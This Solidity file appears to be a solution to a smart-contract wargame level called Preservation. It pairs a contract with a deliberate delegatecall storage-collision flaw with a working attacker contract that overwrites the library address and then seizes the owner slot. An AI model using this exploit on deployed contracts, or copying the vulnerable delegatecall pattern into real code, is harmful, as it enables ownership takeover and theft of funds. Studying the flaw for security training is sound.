// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function getTime() public view returns (uint) {
    return storedTime;
  }
}

// Simple library contract to set the time
contract LibraryContract {
  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

// check the gas limit, may fail due to internal transaction running out of gas
contract MyLibraryContract {
  address public randomAddr1;
  address public randomAddr;
  address public owner;

  function _setMeAsTimeLibrary(Preservation _ctr) private {
    _ctr.setFirstTime(uint256(uint160(address(this))));
  }

  function _callToSetTime(Preservation _ctr) private {
    _ctr.setFirstTime(100);
  }

  function preservationAttack(Preservation _ctr) public {
    _setMeAsTimeLibrary(_ctr);
    _callToSetTime(_ctr);
  }

  function setTime(uint256 _time) public {
    owner = tx.origin;
  }
}
